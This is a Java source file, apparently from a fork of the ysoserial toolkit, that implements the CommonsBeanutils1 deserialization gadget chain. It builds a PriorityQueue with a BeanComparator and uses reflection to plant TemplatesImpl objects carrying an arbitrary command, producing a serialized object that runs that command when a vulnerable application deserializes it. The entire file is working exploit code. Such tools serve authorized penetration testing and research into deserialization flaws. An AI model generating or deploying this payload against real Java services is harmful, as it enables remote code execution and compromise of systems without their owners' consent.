package com.ding0x0.yso.payloads;

import java.math.BigInteger;
import java.util.PriorityQueue;

import com.ding0x0.yso.payloads.util.Gadgets;
import com.ding0x0.yso.payloads.util.Reflections;
import org.apache.commons.beanutils.BeanComparator;

@SuppressWarnings({ "rawtypes", "unchecked" })
public class CommonsBeanutils1 implements ObjectPayload<Object> {

    public Object getObject(final String command) throws Exception {
        final Object templates = Gadgets.createTemplatesImpl(command);
        // mock method name until armed
        final BeanComparator comparator = new BeanComparator("lowestSetBit");

        // create queue with numbers and basic comparator
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        // stub data for replacement later
        queue.add(new BigInteger("1"));
        queue.add(new BigInteger("1"));

        // switch method called by comparator
        Reflections.setFieldValue(comparator, "property", "outputProperties");

        // switch contents of queue
        final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        queueArray[0] = templates;
        queueArray[1] = templates;

        return queue;
    }
}
